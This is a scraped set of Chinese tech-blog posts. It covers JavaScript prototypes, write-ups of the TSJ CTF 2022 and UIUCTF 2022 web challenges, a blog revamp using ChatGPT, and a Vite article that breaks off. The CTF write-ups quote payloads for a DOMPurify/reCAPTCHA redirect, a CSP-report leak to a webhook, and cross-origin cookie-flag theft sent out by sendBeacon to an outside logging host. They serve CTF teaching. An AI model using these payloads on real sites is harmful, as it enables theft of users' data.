console.log(Function.__proto__.__proto__ === Object.prototype); //true // Object 的 __proto__ 會指向 Function.prototype console.log(Object.__proto__ === Function.prototype); // true 這個東西又會把問題搞得更複雜，在這邊就先不提了。如果想知道的話，可以參考下面這兩篇文章： 从__proto__和prototype来深入理解JS对象和原型链 理解JavaScript的原型链和继承 constructor順帶一提，每一個 prototype 都會有一個叫做constructor的屬性，例如說Person.prototype.constructor，而這個屬性就會指向構造函數。Person.prototype的構造函數是什麼？當然就是Person囉。 function Person(name, age) &#123; this.name = name; this.age = age; &#125; Person.prototype.log = function () &#123; console.log(this.name + ', age:' + this.age); &#125; var nick = new Person('nick', 18); // 這段是要讓大家知道，這邊其實是往原型鍊的上面去找 console.log(nick.constructor === Person); // true console.log(nick.hasOwnProperty('constructor')); // false // Person 的 constructor 就是 Person console.log(Person.prototype.constructor === Person); // true console.log(Person.prototype.hasOwnProperty('constructor')); // true 所以其實constructor也沒什麼好講的，A.prototype.constructor === A，你把 A 用 Function, Person, Object 之類的值帶進去都成立。 有一個比較有趣的地方是，你可以透過這樣的方式來執行一段程式碼：[].slice.constructor(&#39;alert(1)&#39;)()。原理其實就是把Function(&#39;alert(1)&#39;)()的Function用[].slice.constructor來取代掉。 new有了原型鍊的概念之後，就不難理解new這個關鍵字背後會做的事情是什麼。 假設現在有一行程式碼是：var nick = new Person(&#39;nick&#39;);，那它有以下幾件事情要做： 創出一個新的 object，我們叫它 O 把 O 的 __proto__ 指向 Person 的 prototype，才能繼承原型鍊 拿 O 當作 context，呼叫 Person 這個建構函式 回傳 O 我們可以寫一段程式碼來模擬這個情形： function Person(name, age) &#123; this.name = name; this.age = age; &#125; Person.prototype.log = function () &#123; console.log(this.name + ', age:' + this.age); &#125; function newObj(Constructor, arguments) &#123; var o = new Object(); // 讓 o 繼承原型鍊 o.__proto__ = Constructor.prototype; // 執行建構函式 Constructor.apply(o, arguments); // 回傳建立好的物件 return o; &#125; var nick = newObj(Person, ['nick', 18]); nick.log(); // nick, age:18 延伸閱讀：JS 对象机制深剖——new 运算符 總結今天不但更理解了原型鍊到底是什麼東西，也寫了一些簡單的小程式來模擬 JavaScript 在查找原型鍊的過程。藉由自己實作這些機制之後，應該會對原型鍊有更多的一些理解。 在 JavaScript 這個程式語言當中，就是透過原型鍊這樣子的機制，把上下關係給串起來，當你在 A 找不到某個東西的時候，就可以到 A 的 parent（也就是 A.__proto__）去找，還是找不到的話就再往上。而原型鍊的盡頭就是Object.prototype，再往上找就是null了。 在寫這篇文章的時候參考了許多資料，我都附在下面了。有些文章會附上精美圖片，但我覺得從圖片開始反而會有點霧煞煞，因為不知道彼此之間的關聯是怎麼來的。 建議大家看完這篇之後可以看一下底下那些參考資料，也順便複習一下自己的觀念是否正確。 參考資料 JavaScript深入之从原型到原型链 JS原型链图解教程 理解JavaScript的原型链和继承 从__proto__和prototype来深入理解JS对象和原型链 彻底理解JavaScript原型","link":"/2017/08/27/the-javascripts-prototype-chain/"},{"title":"TSJ CTF 2022 - web/Nim Notes 筆記","text":"上個週末除了有我上一篇心得寫的 SUSCTF 2022 以外，還有另外一個 TSJ CTF，裡面也有很多好題，因為時間不太夠所以我只有挑了自己比較有興趣的題目來看，就是標題說的這題 Nim Notes，最後沒解開（還差得遠呢），但解法十分有趣，因此寫一篇來記錄一下官方解法。 作者（maple3142）的 writeup 在這：https://github.com/maple3142/My-CTF-Challenges/tree/master/TSJ%20CTF%202022/Nim%20Notes 題目介紹與解法題目敘述： I made this note taking web app in Nim as a part of learning it. If you have some cool notes about Nim please share it with me! 簡單來說又是一個 CTF 常見的 note taking web app，登入之後可以新增筆記，也可以回報自己的筆記頁面給 admin bot。這題在 render 筆記頁面時，不是從後端直接吐資料，而是從前端打 API 去拿，再 render 在畫面上。 筆記頁面的 HTML 長這樣： &lt;!DOCTYPE html> &lt;html lang=\"en\"> &lt;head> &lt;meta charset=\"UTF-8\" /> &lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" /> &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" /> &lt;link rel=\"stylesheet\" href=\"/css/bootstrap.min.css\" /> &lt;title>Notes&lt;/title> &lt;/head> &lt;body class=\"d-flex flex-column min-vh-100\"> &lt;!-- navbar --> &lt;nav class=\"navbar navbar-expand-lg navbar-dark bg-dark mb-3\"> &lt;div class=\"container-fluid\"> &lt;span class=\"navbar-brand mb-0 h1\">Notes&lt;/span> &lt;ul class=\"navbar-nav\"> &lt;li class=\"nav-item\"> &lt;a class=\"nav-link\" id=\"share-btn\" href=\"javascript:void\">Share To Admin&lt;/a> &lt;/li> &lt;li class=\"nav-item\"> &lt;a class=\"nav-link\" id=\"logout-btn\" href=\"javascript:void\">Logout&lt;/a> &lt;/li> &lt;/ul> &lt;/div> &lt;/nav> &lt;!-- editing area --> &lt;div class=\"container\"> &lt;div class=\"row justify-content-md-center\"> &lt;div class=\"col-8\"> &lt;div class=\"mb-3\"> &lt;input id=\"title\" class=\"form-control\" placeholder=\"Title\" /> &lt;textarea id=\"content\" class=\"form-control\" placeholder=\"e.g. I learned how to use `template` in Nim today :)\" >&lt;/textarea> &lt;div class=\"d-grid gap-2\"> &lt;button class=\"btn btn-primary\" id=\"add-btn\">Add&lt;/button> &lt;/div> &lt;/div> &lt;/div> &lt;/div> &lt;/div> &lt;!-- note template --> &lt;template id=\"note-tmpl\"> &lt;div class=\"col-4\"> &lt;div class=\"card\"> &lt;div class=\"card-body\"> &lt;h5 class=\"note-title card-title\">title&lt;/h5> &lt;h6 class=\"note-author card-subtitle mb-2 text-muted\">author&lt;/h6> &lt;p class=\"note-content card-text\">text&lt;/p> &lt;/div> &lt;/div> &lt;/div> &lt;/template> &lt;!-- note container --> &lt;div class=\"container\"> &lt;div class=\"row\" id=\"notes-container\">&lt;/div> &lt;/div> &lt;!-- footer --> &lt;div class=\"d-flex justify-content-md-center mt-auto\"> &lt;p>&amp;copy; 2022-2087 All rights reserved.&lt;/p> &lt;/div> &lt;!-- hidden logout form--> &lt;form hidden=\"true\" id=\"logout-form\" action=\"/logout\" method=\"post\">&lt;/form> &lt;!-- scripts and recaptcha --> &lt;div class=\"g-recaptcha\" data-sitekey=\"$#\" data-callback=\"tokenCallback\" data-size=\"invisible\">&lt;/div> &lt;script src=\"/js/purify.min.js\">&lt;/script> &lt;script src=\"/js/marked.min.js\">&lt;/script> &lt;script src=\"/js/app.js\">&lt;/script> &lt;script async src=\"https://www.google.com/recaptcha/api.js\">&lt;/script> &lt;/body> &lt;/html> 重點在於 app.js，主要邏輯都在裡面： // rendering notes const container = document.getElementById('notes-container') function createNote(note) &#123; const el = document.importNode(document.getElementById('note-tmpl').content, true) el.querySelector('.note-title').textContent = note.title el.querySelector('.note-author').textContent = note.author el.querySelector('.note-content').innerHTML = DOMPurify.sanitize(marked.parse(note.content)) return el &#125; function loadNotes() &#123; container.textContent = '' fetch('/api/notes' + location.search) .then(r => r.json()) .then(notes => &#123; container.append(...notes.map(createNote)) &#125;) &#125; // submitting notes const titleEl = document.getElementById('title') const contentEl = document.getElementById('content') function trySubmit() &#123; const title = titleEl.value const content = contentEl.value if (title &amp;&amp; content) &#123; fetch('/api/notes', &#123; method: 'POST', headers: &#123; 'Content-Type': 'application/json' &#125;, body: JSON.stringify(&#123; title, content &#125;) &#125;) .then(r => r.json()) .then(r => &#123; if (r.status === 'ok') &#123; titleEl.value = '' contentEl.value = '' loadNotes() &#125; else &#123; alert(r.msg) &#125; &#125;) &#125; &#125; const addBtn = document.getElementById('add-btn') addBtn.addEventListener('click', trySubmit) // logout btn function logout() &#123; document.getElementById('logout-form').submit() &#125; const logoutBtn = document.getElementById('logout-btn') logoutBtn.addEventListener('click', logout) // share to admin btn function tokenCallback(token) &#123; fetch('/api/share', &#123; method: 'POST', headers: &#123; 'Content-Type': 'application/json' &#125;, body: JSON.stringify(&#123; token &#125;) &#125;) .then(r => r.json()) .then(r => &#123; if (r.status === 'ok') &#123; alert('Admin will view your note later!') &#125; else &#123; alert('Sorry, you need to pass recaptcha') &#125; &#125;) &#125; function share() &#123; grecaptcha.execute() &#125; const shareBtn = document.getElementById('share-btn') shareBtn.addEventListener('click', share) // init loadNotes() 唯一可以注入的點在這邊：el.querySelector(&#39;.note-content&#39;).innerHTML = DOMPurify.sanitize(marked.parse(note.content))，但因為有經過 DOMPurify.sanitize，所以沒辦法直接 XSS，而這題的 CSP 也滿嚴格的： default-src &#39;self&#39;; script-src &#39;self&#39; https:&#x2F;&#x2F;www.google.com&#x2F;recaptcha&#x2F; https:&#x2F;&#x2F;www.gstatic.com&#x2F;recaptcha&#x2F;; frame-src https:&#x2F;&#x2F;www.google.com&#x2F;recaptcha&#x2F; https:&#x2F;&#x2F;www.gstatic.com&#x2F;recaptcha&#x2F;; script 基本上只能引入自己或是 reCAPATCHA 的，沒有 unsafe-inline 可以用，其他東西像是 style 也被封死，所以也不會是 CSS injection。我嘗試找了一下 DOM clobbering 能不能幹嘛，但看了一下沒找到可以利用的地方。 原本看到這個 CSP，我以為 https://www.google.com/recaptcha/ 的地方可以用 %2f 來繞過，例如說 JSONBee 上面有個 google.com 的 JSONP payload： &lt;script src=\"https://www.google.com/complete/search?client=chrome&amp;q=hello&amp;callback=alert#1\">&lt;/script> 如果把網址改成：https://www.google.com/recaptcha/..%2fcomplete/search?client=...，瀏覽器會過 CSP，而有些伺服器會把 ..%2f 解讀成 ../，所以就會是我們上面的 endpoint。不過實際嘗試過後發現這招對 google 行不通，只會回傳一個 404 not found，所以無法利用。 總之呢，大概卡了一兩個小時，連第一步怎麼開始都找不到。 後來官方有給了兩個提示，第一個提示是說第一步要先讓 admin bot 可以訪問到自己的網站，因此筆記頁面應該有個可以重新導向的漏洞。第二個則是明顯提示第一步的關鍵在 reCAPATCHA，仔細看文件就會找到答案。 從文件中不難發現有個屬性可以利用：data-error-callback，描述是： Optional. The name of your callback function, executed when reCAPTCHA encounters an error (usually network connectivity) and cannot continue until connectivity is restored. If you specify a function here, you are responsible for informing the user that they should retry. 當 reCAPTCHA 載入失敗的時候，就會呼叫這個屬性寫的 function，所以下一步就是看程式碼中有哪些 function 可以利用，找到了這個： function logout() &#123; document.getElementById('logout-form').submit() &#125; 原本的 logout-form 的位置在筆記插入的位置下面，所以我們可以用別的 form 把它蓋掉。 因為 DOMPurify 預設不會過濾 form，也不會過濾 data- 開頭的屬性，所以可以用下面這段 HTML 來讓網頁重新導向： &lt;form action=\"https://example.com\" id=\"logout-form\">&lt;/form> &lt;div class=\"g-recaptcha\" data-sitekey=\"A\" data-error-callback=\"logout\" data-size=\"invisible\">&lt;/div> 第一階段就這樣完成了，可以把 admin bot 導到任意頁面，當初看完提示解到這邊我就卡住了，看很久看不出下一步可以做什麼。 看了一下解答，第二階段是 setCookie 的 CRLF injection，但因為注入的點在 CSP header 下面，所以沒辦法 disable CSP，因此就算你可以控制 response，理論上也沒辦法 XSS，這時候就來到了第三階段。 在講第三階段之前先提一下非預期解，破除了「理論上沒辦法 XSS」這個前提，原因出在 nim 的 sqlite library 在內容含有 \\0 的時候會爆炸，爆炸之後會直接噴錯誤訊息而且沒有 CSP header，就得到了一個開心的 XSS。 繼續講回精彩的第三階段。 第三階段是利用 Content-Security-Policy-Report-Only 這個 header 來 leak flag，主要是因為違反規則時，會發送一段 JSON 到 server，其中有個 script-sample，如果是 inline script 違反的話會有前 40 個字元（還有一個前提，那就是 CSP 要加上 report-sample）。 我們可以自己弄個簡單的 server 來驗證： const express = require('express') const app = express() app.get('/abc', (req, res) => &#123; res.header('Content-Security-Policy', \"default-src 'self'; script-src 'self';\") res.header('Content-Security-Policy-Report-Only', \"script-src 'report-sample'; report-uri https://webhook.site/419d518f-922b-4e1e-8583-65596fae1c95\") res.send(` &lt;body> &lt;h1>hello&lt;/h1> &lt;script>flag&#123;test_flag&#125;&lt;/script> &lt;/body> `) res.end() &#125;) app.listen(3000, () => &#123; console.log('listening on http://localhost:3000') &#125;) 從瀏覽器就可以看到送出去的 request 長怎樣： &#123; &quot;csp-report&quot;: &#123; &quot;document-uri&quot;: &quot;http:&#x2F;&#x2F;localhost:3000&#x2F;abc&quot;, &quot;referrer&quot;: &quot;&quot;, &quot;violated-directive&quot;: &quot;script-src-elem&quot;, &quot;effective-directive&quot;: &quot;script-src-elem&quot;, &quot;original-policy&quot;: &quot;script-src &#39;report-sample&#39;; report-uri https:&#x2F;&#x2F;webhook.site&#x2F;419d518f-922b-4e1e-8583-65596fae1c95&quot;, &quot;disposition&quot;: &quot;report&quot;, &quot;blocked-uri&quot;: &quot;inline&quot;, &quot;line-number&quot;: 4, &quot;source-file&quot;: &quot;http:&#x2F;&#x2F;localhost:3000&#x2F;abc&quot;, &quot;status-code&quot;: 200, &quot;script-sample&quot;: &quot;flag&#123;test_flag&#125;&quot; &#125; &#125; 靠著這個，就可以順利拿到 flag，打完收工。 其他可能性在寫這篇的時候，我邊寫邊在每一個環節想有沒有其他可能性，但是在原題這麼嚴格的條件底下，能想到的路很有限，不過如果在原題上面做一些變化，放寬一些限制，倒是有其他可能。 Open redirect這個是原題不變的狀況下我唯一能想到的其他解法，就是找到 https://www.google.com/recaptcha/ 或是 https://www.gstatic.com/recaptcha/ 的 open redirect 或 JSONP，就可以繞過 CSP 去執行 JavaScript。 CSS injection假如 CSP 放寬，script 的部分一樣擋住，但是其他 style 相關的像是 style-src、font-src 跟 img-src 之類的都不擋的話，那在第三階段似乎有機會用 CSS injection 的方式把 flag 慢慢 leak 出來。","link":"/2022/03/02/tsj-ctf-2022-nim-notes/"},{"title":"UIUCTF 2022 筆記","text":"其實沒有參加這一次的 CTF，但有稍微看到兩題跟 content type 有關的題目覺得有趣，來記一下解法。 modernism(21 solves)程式碼超簡單： from flask import Flask, Response, request app = Flask(__name__) @app.route('/') def index(): prefix = bytes.fromhex(request.args.get(\"p\", default=\"\", type=str)) flag = request.cookies.get(\"FLAG\", default=\"uiuctf&#123;FAKEFLAG&#125;\").encode() #^uiuctf&#123;[A-Za-z]+&#125;$ return Response(prefix+flag, mimetype=\"text/plain\") 會把你送去的資料 hex decode 以後加在 response 的 flag 前面，就這樣。有一個 admin bot 會帶著 flag 在 cookie 去造訪你的頁面。 這題我原本想說 text/plain 不能被當作 script 載入，就算沒有加 X-Content-Type-Options: nosniff 也一樣，後來發現我記錯了，其實是可以的。 相關程式碼在 third_party&#x2F;blink&#x2F;renderer&#x2F;platform&#x2F;loader&#x2F;allowed_by_nosniff.cc // Helper function to decide what to do with with a given mime type. This takes // - a mime type // - inputs that affect the decision (is_same_origin, mime_type_check_mode). // // The return value determines whether this mime should be allowed or blocked. // Additionally, warn returns whether we should log a console warning about // expected future blocking of this resource. 'counter' determines which // Use counter should be used to count this. 'is_worker_global_scope' is used // for choosing 'counter' value. bool AllowMimeTypeAsScript(const String&amp; mime_type, bool same_origin, AllowedByNosniff::MimeTypeCheck mime_type_check_mode, WebFeature&amp; counter) &#123; using MimeTypeCheck = AllowedByNosniff::MimeTypeCheck; // If strict mime type checking for workers is enabled, we'll treat all // \"lax\" for worker cases as strict. if (mime_type_check_mode == MimeTypeCheck::kLaxForWorker &amp;&amp; RuntimeEnabledFeatures::StrictMimeTypesForWorkersEnabled()) &#123; mime_type_check_mode = MimeTypeCheck::kStrict; &#125; // The common case: A proper JavaScript MIME type if (MIMETypeRegistry::IsSupportedJavaScriptMIMEType(mime_type)) return true; // Check for certain non-executable MIME types. // See: // https://fetch.spec.whatwg.org/#should-response-to-request-be-blocked-due-to-mime-type? if (mime_type.StartsWithIgnoringASCIICase(\"image/\")) &#123; counter = WebFeature::kBlockedSniffingImageToScript; return false; &#125; if (mime_type.StartsWithIgnoringASCIICase(\"audio/\")) &#123; counter = WebFeature::kBlockedSniffingAudioToScript; return false; &#125; if (mime_type.StartsWithIgnoringASCIICase(\"video/\")) &#123; counter = WebFeature::kBlockedSniffingVideoToScript; return false; &#125; if (mime_type.StartsWithIgnoringASCIICase(\"text/csv\")) &#123; counter = WebFeature::kBlockedSniffingCSVToScript; return false; &#125; if (mime_type_check_mode == MimeTypeCheck::kStrict) &#123; return false; &#125; DCHECK(mime_type_check_mode == MimeTypeCheck::kLaxForWorker || mime_type_check_mode == MimeTypeCheck::kLaxForElement); // Beyond this point we handle legacy MIME types, where it depends whether // we still wish to accept them (or log them using UseCounter, or add a // deprecation warning to the console). if (EqualIgnoringASCIICase(mime_type, \"text/javascript1.6\") || EqualIgnoringASCIICase(mime_type, \"text/javascript1.7\")) &#123; // We've been excluding these legacy values from UseCounter stats since // before. return true; &#125; if (mime_type.StartsWithIgnoringASCIICase(\"application/octet-stream\")) &#123; counter = kApplicationOctetStreamFeatures[same_origin]; &#125; else if (mime_type.StartsWithIgnoringASCIICase(\"application/xml\")) &#123; counter = kApplicationXmlFeatures[same_origin]; &#125; else if (mime_type.StartsWithIgnoringASCIICase(\"text/html\")) &#123; counter = kTextHtmlFeatures[same_origin]; &#125; else if (mime_type.StartsWithIgnoringASCIICase(\"text/plain\")) &#123; counter = kTextPlainFeatures[same_origin]; &#125; else if (mime_type.StartsWithIgnoringCase(\"text/xml\")) &#123; counter = kTextXmlFeatures[same_origin]; &#125; else if (mime_type.StartsWithIgnoringCase(\"text/json\") || mime_type.StartsWithIgnoringCase(\"application/json\")) &#123; counter = kJsonFeatures[same_origin]; &#125; else &#123; counter = kUnknownFeatures[same_origin]; &#125; return true; &#125; 可是就算可以被當作是 script 引入，也沒辦法輕易弄成可以執行的語法，因為 flag 中有 &#123;&#125;。 非預期解是利用 class，前面加上 class 就變成 class uiuctf&#123;fakeflag&#125;，有了這個之後你只要 uiuctf+&#39;&#39; 就可以得到當初宣告 class 時的那一整串東西，就拿到 flag 了。 預期解是前面加上 BOM，讓 JS 把整個腳本用 UTF-16 去解讀，就會把原本那一串 flag 變成奇怪的中文字，就不會壞了，前面則可以加上 ++window.，之後去看 window 的每個屬性就好。 作者的解法如下： &lt;!DOCTYPE html> &lt;html lang=\"en\"> &lt;head> &lt;meta charset=\"UTF-8\" /> &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" /> &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\" /> &lt;title>Static Template&lt;/title> &lt;/head> &lt;body> &lt;!-- we use a BOM (byte order mark) to change the encoding of the document and cause it to be interpreted as valid JS BOM = magic unicode character at start of document to indicate encoding and endianness chrome supports the UTF16-BE and UTF16-LE BOMs: FE FF and FF FE we then encode: ++window. as UTF16-BE 2B2B7769006E0064006F0077002E so the JS executed is: ++window.RANDOM_UNICODE_CHARACTERS - luckily, when decoding the flag format as UTF-16 BE, the resultant characters will always be a valid JS identifier - this is NOT true in precisionism, due to the space and ! characters in the suffix Finally, we iterate through the `window` object, and utf16-be encode the added property to get the flag --> &lt;script src=\"https://modernism-web.chal.uiuc.tf/?p=FEFF002B002B00770069006E0064006F0077002E\">&lt;/script> &lt;script> const encutf16=(s)=>[...s].flatMap(c=>[String.fromCharCode(c.charCodeAt(0)>>8),String.fromCharCode(c.charCodeAt(0)&amp;0xff)]).join(''); const flag = Object.getOwnPropertyNames(window).map(x=>encutf16(x)).find(x=>x.startsWith('uiuctf&#123;')); navigator.sendBeacon(\"//hc.lc/log2.php?modernism\",flag); &lt;/script> &lt;/body> &lt;/html> precisionism(3 solves)這題跟上題很像，只是結尾多加了一些東西： from flask import Flask, Response, request app = Flask(__name__) @app.route('/') def index(): prefix = bytes.fromhex(request.args.get(\"p\", default=\"\", type=str)) flag = request.cookies.get(\"FLAG\", default=\"uiuctf&#123;FAKEFLAG&#125;\").encode() #^uiuctf&#123;[0-9A-Za-z]&#123;8&#125;&#125;$ return Response(prefix+flag+b\"Enjoy your flag!\", mimetype=\"text/plain\") 因為多加的那些東西，所以前面那兩招都不能用。 這題的預期解是把 response 弄成 ICO 格式，然後把要 leak 的部分放到 width 去，就可以 cross origin 拿圖片寬度，一個 byte 一個 byte 拿出來： 作者解法： &lt;!DOCTYPE html> &lt;html lang=\"en\"> &lt;head> &lt;meta charset=\"UTF-8\" /> &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" /> &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\" /> &lt;title>Static Template&lt;/title> &lt;/head> &lt;body> &lt;h1> This is a static template, there is no bundler or bundling involved! &lt;/h1> &lt;script> const sleep = () => new Promise((res) => setTimeout(res, 50)); async function exfil(i) &#123; let img = new Image(); let p = \"00000100020001010000010020006804000026000000\"; if (i>0) p = p.slice(0, -i*2); img.src = `https://precisionism-web.chal.uiuc.tf/?p=$&#123;p&#125;`; await img.decode(); return img.width; &#125; async function main() &#123; for (let i = 0; i &lt; 16; i++) &#123; let c = await exfil(i); console.log(String.fromCharCode(c)); navigator.sendBeacon(\"//hc.lc/log2.php?precisionism\",String.fromCharCode(c)+\" \"+c) &#125; &#125; main(); &lt;/script> &lt;/body> &lt;/html> 總結話說我還有特別研究了一下 chromium 怎麼做 mime sniffing，不過這次題目跟這個好像沒太大關係，還是筆記一下位置：https://source.chromium.org/chromium/chromium/src/+/master:net/base/mime_sniffer.cc","link":"/2022/08/01/uiuctf-2022-writeup/"},{"title":"利用 chatGPT 翻新部落格","text":"我的部落格架構其實很久沒有大幅改動過了，hexo 現在已經出到 v6，v7 正在 beta，而我的部落格還停留在 hexo3。 最近想說剛好比較有空，就趁機找時間翻新部落格，順便運用了 chatGPT 來當小助手。 這次做的改動有： Hexo 升級版本 修改 syntax highlight 深色模式 自動翻譯（重點） Hexo 升級版本這次升級比我想像中順利很多，照著網路上找到的教學安裝 npm-upgrade，跑一下之後就升級了，而且升級之後沒什麼東西需要調整。 真是順利！ 修改 syntax highlight原本用的是 highlight.js，但想換很久了，原因是這套不支援 JSX。 升級版本之後發現 Hexo 內建就有支援另一套 Prism.js，就順便換過去了，只要改一下設定檔跟手動新增 style 就弄好了，其實滿簡單的。 比較麻煩的是有些 class 跟其他 library 有衝突，就需要再手動調整一下。 深色模式 我的佈景主題用了 Bulma 這一套 CSS library，而它並不支援深色模式，因此要自己做一個。 我改的方式也很簡單，就是先找到頁面上每一個字跟背景的顏色，把它換成 CSS variable，最後加上一點簡單的 JavaScript 就完成了。 CSS 部分像是這樣： :root &#123; --main-text-color: #4a4a4a; --main-bg-color: white; --main-border-color: #dbdbdb; --title-text-color: #363636; --link-text-color: #3273dc; --link-hover-text-color: #363636; --code-bg-color: whitesmoke; --code-text-color: #ff3860; --tag-bg-color: whitesmoke; --tag-text-color: #363636; --quote-bg-color: whitesmoke; --nav-link-text-color: darkgray; --notice-bg-color: #ffe4c4; --archive-time-color: #888; --archive-hover-border-color: black; &#125; body.dark-mode &#123; --main-text-color: #f8f8f8; --main-bg-color: #061320; --main-border-color: #dbdbdb; --title-text-color: #fafafa; --link-text-color: #27ebda; --link-hover-text-color: #98fff6; --code-bg-color: #324b7e; --code-text-color: #f7f7f7; --tag-bg-color: whitesmoke; --tag-text-color: #363636; --quote-bg-color: #49495e; --nav-link-text-color: #b4b5b4; --notice-bg-color: #257800; --archive-time-color: #ddd; --archive-hover-border-color: #51ce97; &#125; JavaScript 則是這樣： if (localStorage.getItem('dark-mode')) &#123; if (localStorage.getItem('dark-mode') === 'true') &#123; document.body.classList.add('dark-mode') &#125; &#125; else &#123; if (window.matchMedia &amp;&amp; window.matchMedia('(prefers-color-scheme: dark)').matches) &#123; document.body.classList.add('dark-mode') &#125; &#125; 大概花了半天左右的時間邊改邊測，就可以全部弄完。 另外順便解決了一下 CSS 大小的問題，用這個服務可以幫你把沒有用到的 CSS 清掉：https://purifycss.online/ 雖然說還是會有些殘留或是誤刪，所以記得用完之後要自己再檢查一遍。 自動翻譯重頭戲來了，這個功能大幅依靠 chatGPT 幫我完成。 首先是最重要的翻譯的部分，靠的是 markdown-gpt-translator 這個套件，會幫你自動分段然後 call API，再把結果組裝回來。 還有一點很棒的是 code block 不會上傳，所以省了很多 token，但要注意的是 code block 裡面的 comment 要自己翻譯。 當初驗證過這一個翻譯的 lib 可以用之後，我就著手進行修改，順便跟我原本想要的自動翻譯功能整合。 然後，因為 TypeScript 的環境設置有點麻煩，我用了這個工具幫我直接轉成 JavaScript：https://transform.tools/typescript-to-javascript 自動翻譯要先把以前舊的文章全部翻一遍，流程是： 列出所有文章的檔案 查看翻譯後的版本是否存在 不存在，呼叫翻譯並寫入檔案 這些功能的框架都直接丟給 chatGPT 幫我寫，我自己再調整一下，補充一下細節即可。 以我自己的文章來說，翻譯一篇需要一分鐘左右，價錢的話大約是 0.02 ~ 0.04 美元。部落格總共 100 多篇文章，翻譯完之後花了不到 3 塊美金，我覺得滿便宜的。 不過當然還是會有一些需要手動調整的地方，而且還不少，所以還是需要人來做這件事情，我把程式碼跟需要注意的地方都放在這邊了：https://github.com/aszx87410/huli-blog/tree/master/apps/translator 其實原本翻譯完以後，我想說我一篇一篇看過，但發現有點太花時間了，所以就先放著了，等之後有時間再來 review。 翻新 Open Graph Image之前寫了一個產生瀏覽圖的小功能，但是以前很多文章都還沒用到這個功能，這次也靠 chatGPT 幫我寫了一個小程式能夠快速轉換。 稍微翻修了一下以前的程式碼，順便把以前文章全部掃過一遍，沒產生的就自動產生，然後加上正確的路徑。 還沒做好的功能最後記一下還沒做好的功能，以後要找比較方便： 更新 sitemap 檢查英文文章連結 檢查英文文章內容 修改留言系統 修改多語系 RSS 自動壓縮圖片","link":"/2023/06/20/update-blog-with-chatgpt/"},{"title":"Vite 怎麼能那麼快？從 ES modules 開始談起","text":"前言不知道大家有沒有聽過 vite 這個工具，看它名字有個 v，大概就可以猜到可能跟 Vue 有關。沒錯，這是 Vue 的作者尤雨溪開發出來的另外一套工具，原本是想要給 VuePress 用的，但是強大之處就在於它不僅限於此。 Vite 在 GitHub 上的 About 只寫了兩個句子： Native-ESM powered web dev build tool. It’s fast. 如果你有體驗過，就會發現真的很快。Vite 是 build tool 跟 dev server 的綜合體，這篇會簡單教大家使用一下 vite，然後來談 ES modules，再來看看 vite 神奇的地方。 初探 Vite先來大致講一下 vite 這個工具到底是在做什麼。我們可以從它的定位來看：build tool + dev server，我們先著重於後面那一塊。Dev server 就是像我們用 webpack 時會用的 webpack dev server + hot module reload，提供給我們 local 開發的環境，讓我們只要存檔以後就會自動更新整個 app，已經是現在寫前端不可或缺的工具了。 而 vite 的概念也是如此，就是提供一個「更快速的 dev server」，讓我們在開發時能夠使用。 接著直接帶大家跑一次流程。 雖然說 vite 跟 Vue 的整合度最好，但 vite 並不是 Vue 專屬的工具。事實上，不管是什麼都可以用 vite 來開發，而 vite 也提供了 React 的 template。 我們直接拿 React 來做示範： npm init vite-app react-demo --template react cd react-demo npm install npm run dev 就這短短四行指令，立刻讓你體驗 vite 的威力。第一行就是用 vite 提供的工具幫你產生一個 boilerplate 出來，之後切進去資料夾裡面進行開發。 成功以後 terminal 會跟你說 dev server 跑起來了，接著打開：http://localhost:3000 ，就會看到熟悉的一直轉圈圈的 React 接著我們試著打開 src/App.jsx，隨意更改一些東西存檔，就會看到 React app 非常快速地更新了。Vite 無論是啟動的速度還是更新的速度，都比 create-react-app 或者是 webpack dev server 快上不少。在推特上也有一些人針對這兩者做了一些比較，vite 顯然是樂勝的。 Vite 這麼快的原因到底是什麼？我就直說了，就是 Native ES Modules。所以接下來，就讓我們看看什麼是 Native ES Modules。 Native ES Modules在繼續往下讀之前，建議大家要先知道在 JavaScript 裡面 module 發展的一些歷史，可以先參考我之前寫過的這篇文章：webpack 新手教學之淺談模組化與 snowpack。 在文章中我有提到，早期在瀏覽器並沒有原生的 module 機制，所以才會產生出各個標準，像是大家可能都有聽過的 CommonJS、AMD 或是 UMD。但是這點在 ES6 的時候有了改變，因為 ES6 的規範裡終於有 module 了！我們就稱這個做 ES Modules，簡稱 ESM。 ESM 的規範其實大家應該都用過，就是： &#x2F;&#x2F; a.js export const PI &#x3D; 3.14 &#x2F;&#x2F; b.js import &#123; PI &#125; from &#39;.&#x2F;a&#39; 只要你看到 export 跟 import，那八成就是 ESM 的語法。除了有了規範以外，更令人興奮的是現在所有的主流瀏覽器都已經原生支援 ESM 了！ 我這邊做了一個簡單的 demo 網站：https://aszx87410.github.io/esm-demo/vanilla/index.html 打開以後可以開啟 devtool 並切到 network tab 去，點開 index.js 跟 utils.js，發現兩個檔案都是使用 ESM 的語法： 採用原生的 ESM 載入機制，就是 Native ESM，讓瀏覽器來幫你處理這些 import 跟 export 的東西。 等等，我剛特地強調原生這兩個字，難道說還有其他東西不是原生的嗎？是的，沒錯喔。你平常在用的 webpack 或者是類似的工具，別忘了它的名稱叫做「bundler」，就是要把你的 JS 檔案跟 dependencies 打包在一起。儘管你在寫程式的時候是用 import 跟 export 沒錯，但是在輸出時很有可能已經被 babel 或者是 webpack 轉成 CommonJS 或是其他形式了，而且外面還有再包一層來負責解析 require 這一些語法。 而這也是 webpack 這些打包工具之所以慢的原因，那就是他們需要靜態分析過 app 的所有檔案以及套件的相依性，然後根據這些資訊把東西包在一起，當你的檔案愈來愈大的時候，花的時間也就自然愈來愈多，因為 webpack 要搞清楚到底要怎麼打包。 如果我們能避開 bundling，不要把所有東西都包在一起的話，是不是就會快很多了？ 是，這就是為什麼 vite 這麼快。 再探 vite在稍早附的文章裡面我有提到了 snowpack，其實 snowpack 的概念與 vite 相當類似，都是採用了 Native ESM 的解法。與其把東西全部打包在一起，不如好好利用瀏覽器，讓瀏覽器幫你處理那些複雜的相依性。 像是 snowpack 就會把你用到的 node_modules 放到一個特定的地方讓你可以引入。 接著我們可以回來看 vite 了，打開我們剛開始裝的那個 demo 專案並且開啟 devtool 然後切到 network，一目瞭然： 原理就跟 snowpack 滿像的，都是使用 ESM 去載入不同的 package，才會看到瀏覽器有這麼多的 request。 點開 